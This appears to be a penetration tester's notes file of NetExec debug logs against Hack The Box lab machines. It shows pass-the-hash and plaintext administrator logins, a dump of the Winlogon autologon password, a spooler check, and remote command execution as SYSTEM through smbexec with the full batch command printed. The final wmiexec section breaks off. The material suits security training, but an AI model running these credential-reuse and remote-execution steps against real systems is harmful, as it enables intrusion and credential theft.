           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.95.180'], username=['EGOTISTICAL-BANK.LOCAL\\administrator'], password=[], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                        
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['reg-winlogon'], module_options=[], list_modules=False, show_module_options=False,                                              
                    hash=['823452073d75b9d1cf70ebdf86c7f98e'], delegate=None, no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None,                            
                    smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False,                   
                    dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None,                     
                    computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='',                
                    depth=None, only_files=False, pattern=None, regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False,                   
                    execute=None, ps_execute=None, obfs=False, amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                 
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
[12:16:25] DEBUG    Modules to be Loaded for sanity check: ['reg-winlogon'], <class 'list'>                                                                                                                                   netexec.py:182
           DEBUG    Loading module for sanity check reg-winlogon at path /usr/lib/python3/dist-packages/nxc/modules/reg-winlogon.py                                                                                           netexec.py:189
           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.95.180, hostname=10.129.95.180, kerberos=False, ipv6=False, link-local ipv6=False                                                                                             connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.95.180                                                                                                                                                                    smb.py:606
[12:16:27] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Server OS: Windows 10 / Server 2019 Build 17763 10.0 build 17763                                                                                                                                              smb.py:280
[12:16:29] INFO     Creating SMBv1 connection to 10.129.95.180                                                                                                                                                                    smb.py:575
[12:16:30] INFO     SMBv1 disabled on 10.129.95.180                                                                                                                                                                               smb.py:598
           DEBUG    Update Hosts: [{'id': 5, 'ip': '10.129.95.180', 'hostname': 'SAUNA', 'domain': 'EGOTISTICAL-BANK.LOCAL', 'os': 'Windows 10 / Server 2019 Build 17763', 'dc': None, 'smbv1': False, 'signing': True,      database.py:265
                    'spooler': None, 'zerologon': None, 'petitpotam': None}]                                                                                                                                                                
           DEBUG    add_host() - Host IDs Updated: [5]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname EGOTISTICAL-BANK.LOCAL: [Errno -2] Name or service not known                                                                                                                  connection.py:192
           INFO     Resolved domain: EGOTISTICAL-BANK.LOCAL with dns, kdcHost: None                                                                                                                                               smb.py:321
[12:16:30] INFO     SMB         10.129.95.180   445    SAUNA            Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)                                        smb.py:327
           DEBUG    ['823452073d75b9d1cf70ebdf86c7f98e']                                                                                                                                                                   connection.py:443
           INFO     Creating SMBv3 connection to 10.129.95.180                                                                                                                                                                    smb.py:606
[12:16:34] DEBUG    Logged in with hash to SMB with EGOTISTICAL-BANK.LOCAL/administrator                                                                                                                                          smb.py:532
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:534
           DEBUG    Checking if user is admin on 10.129.95.180                                                                                                                                                                    smb.py:646
[12:16:50] DEBUG    User is admin on 10.129.95.180!                                                                                                                                                                               smb.py:661
           DEBUG    Adding credentials: [{'id': 13, 'domain': 'EGOTISTICAL-BANK.LOCAL', 'username': 'administrator', 'password': '823452073d75b9d1cf70ebdf86c7f98e', 'credtype': 'hash', 'pillaged_from_hostid': None}]      database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.95.180                                                                                                                                                              database.py:133
           DEBUG    smb hosts() - results: [(5, '10.129.95.180', 'SAUNA', 'EGOTISTICAL-BANK.LOCAL', 'Windows 10 / Server 2019 Build 17763', None, False, True, None, None, None)]                                            database.py:485
[12:16:50] INFO     SMB         10.129.95.180   445    SAUNA            EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)                                                                            smb.py:544
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.95.180                                                                                                                                                              database.py:133
           DEBUG    smb hosts() - results: [(5, '10.129.95.180', 'SAUNA', 'EGOTISTICAL-BANK.LOCAL', 'Windows 10 / Server 2019 Build 17763', None, False, True, None, None, None)]                                            database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f6b64123690>, hosts: [(5, '10.129.95.180', 'SAUNA', 'EGOTISTICAL-BANK.LOCAL', 'Windows 10 / Server 2019 Build 17763', None, False, True,      database.py:362
                    None, None, None)]                                                                                                                                                                                                      
           INFO     Loading modules for target: 10.129.95.180                                                                                                                                                              connection.py:589
           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
           DEBUG    Loading module reg-winlogon - <NXCModule.NXCModule object at 0x7f6b6410cc20>                                                                                                                           connection.py:273
           DEBUG    Loading context for module reg-winlogon - <NXCModule.NXCModule object at 0x7f6b6410cc20>                                                                                                               connection.py:283
           DEBUG    Module reg-winlogon has on_admin_login method                                                                                                                                                          connection.py:297
[12:17:03] INFO     REG-WINL... 10.129.95.180   445    SAUNA            AutoAdminLogon:                                                                                                                                   reg-winlogon.py:43
[12:17:04] INFO     REG-WINL... 10.129.95.180   445    SAUNA            DefaultDomainName: EGOTISTICALBANK                                                                                                                reg-winlogon.py:41
[12:17:06] INFO     REG-WINL... 10.129.95.180   445    SAUNA            DefaultUserName: EGOTISTICALBANK\svc_loanmanager                                                                                                  reg-winlogon.py:41
[12:17:07] INFO     REG-WINL... 10.129.95.180   445    SAUNA            DefaultPassword: Moneymakestheworldgoround!                                                                                                       reg-winlogon.py:41
[12:17:09] ERROR    Exception while calling proto_flow() on target 10.129.95.180: SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running         connection.py:171
                    services are dependent on.                                                                                                                                                                                              
           DEBUG    Closing connection to: 10.129.95.180                                                                                                                                                                   connection.py:178
```


### -M spooler
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M spooler --debug
[16:40:51] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['spooler'], module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None,                           
                    no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None,                                  
                    generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False,                     
                    filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False,                    
                    rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None,                       
                    regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False,                    
                    amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                            
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[16:40:52] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Modules to be Loaded for sanity check: ['spooler'], <class 'list'>                                                                                                                                        netexec.py:182
           DEBUG    Loading module for sanity check spooler at path /usr/lib/python3/dist-packages/nxc/modules/spooler.py                                                                                                     netexec.py:189
           DEBUG    Supported protocols: ['smb', 'wmi']                                                                                                                                                                   moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[16:40:54] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[16:40:56] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[16:40:58] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': True,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[16:40:58] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[16:41:00] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[16:41:10] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
[16:41:10] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fd39f0f8c20>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           INFO     Loading modules for target: 10.129.175.223                                                                                                                                                             connection.py:589
           DEBUG    Supported protocols: ['smb', 'wmi']                                                                                                                                                                   moduleloader.py:71
           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
           DEBUG    Loading module spooler - <NXCModule.NXCModule object at 0x7fd39f0c4590>                                                                                                                                connection.py:273
           DEBUG    Loading context for module spooler - <NXCModule.NXCModule object at 0x7fd39f0c4590>                                                                                                                    connection.py:283
           DEBUG    Module spooler has on_login method                                                                                                                                                                     connection.py:293
           DEBUG    StringBinding ncacn_ip_tcp:10.129.175.223[135]                                                                                                                                                             spooler.py:48
[16:41:14] DEBUG    Protocol: [MS-RPRN]: Print System Remote Protocol                                                                                                                                                          spooler.py:84
           DEBUG    Provider: spoolsv.exe                                                                                                                                                                                      spooler.py:85
           DEBUG    UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 IPSec Policy agent endpoint                                                                                                                            spooler.py:86
           DEBUG    Bindings:                                                                                                                                                                                                  spooler.py:87
           DEBUG              ncalrpc:[LRPC-86204a01a6d512c7f4]                                                                                                                                                                spooler.py:89
           DEBUG              ncacn_ip_tcp:10.129.175.223[49169]                                                                                                                                                               spooler.py:89
           DEBUG                                                                                                                                                                                                               spooler.py:90
[16:41:14] INFO     SPOOLER     10.129.175.223  445    DC               Spooler service enabled                                                                                                                                spooler.py:91
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': True,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           DEBUG    [Spooler] Received 155 endpoints                                                                                                                                                                          spooler.py:112
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### -M webdav


### --exec-method 'smbexec'
```sh
└─$ netexec smb 10.129.172.255 --share 'C$' -u 'active.htb\administrator' -p 'Ticketmaster1968' --exec-method 'smbexec' -x 'whoami' --debug
[08:49:00] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.172.255'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='smbexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute='whoami', ps_execute=None, obfs=False, amsi_bypass=None,                         
                    clear_obfscripts=False, force_ps32=False, no_encode=False, exec_method_explicitly_set=True)                                                                                                                             
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
[08:49:01] DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.172.255, hostname=10.129.172.255, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[08:49:02] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[08:49:03] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[08:49:05] INFO     Creating SMBv1 connection to 10.129.172.255                                                                                                                                                                   smb.py:575
[08:49:06] INFO     SMBv1 disabled on 10.129.172.255                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.172.255', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [4]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[08:49:06] INFO     SMB         10.129.172.255  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[08:49:08] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.172.255                                                                                                                                                                   smb.py:646
[08:49:17] DEBUG    User is admin on 10.129.172.255!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[08:49:17] INFO     SMB         10.129.172.255  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.172.255                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7efff14260b0>, hosts: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling execute()                                                                                                                                                                                      connection.py:263
           DEBUG    StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]                                                                                                                                                        smbexec.py:48
[08:49:21] INFO     Executed command via smbexec                                                                                                                                                                                  smb.py:798
           DEBUG    Hosting batch file with command: %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\nAZtCi 2^>^&1 > %TEMP%\exZdDL.bat & %COMSPEC% /Q /c %TEMP%\exZdDL.bat & %COMSPEC% /Q /c del %TEMP%\exZdDL.bat         smbexec.py:102
           DEBUG    Command to execute: %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\nAZtCi 2^>^&1 > %TEMP%\exZdDL.bat & %COMSPEC% /Q /c %TEMP%\exZdDL.bat & %COMSPEC% /Q /c del %TEMP%\exZdDL.bat                      smbexec.py:103
           DEBUG    Remote service RydXjDLmaO created.                                                                                                                                                                        smbexec.py:104
           DEBUG    Remote service RydXjDLmaO started.                                                                                                                                                                        smbexec.py:125
[08:49:22] DEBUG    Remote service RydXjDLmaO deleted.                                                                                                                                                                        smbexec.py:131
[08:49:23] INFO     Attempting to read C$\nAZtCi                                                                                                                                                                              smbexec.py:147
[08:49:26] DEBUG    Deleting file C$\nAZtCi                                                                                                                                                                                   smbexec.py:176
[08:49:30] DEBUG    Raw Output: nt authority\system                                                                                                                                                                               smb.py:817
                                                                                                                                                                                                                                            
           DEBUG    Cleaned Output: nt authority\system                                                                                                                                                                           smb.py:819
[08:49:30] INFO     SMB         10.129.172.255  445    DC               Executed command via smbexec                                                                                                                              smb.py:826
[08:49:30] INFO     SMB         10.129.172.255  445    DC               nt authority\system                                                                                                                                       smb.py:829
           DEBUG    Closing connection to: 10.129.172.255                                                                                                                                                                  connection.py:178
```


### --exec-method 'wmiexec'
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --exec-method 'wmiexec' -x 'whoami' --debug
[10:34:55] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute='whoami', ps_execute=None, obfs=False, amsi_bypass=None,                         
                    clear_obfscripts=False, force_ps32=False, no_encode=False, exec_method_explicitly_set=True)                                                                                                                             
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
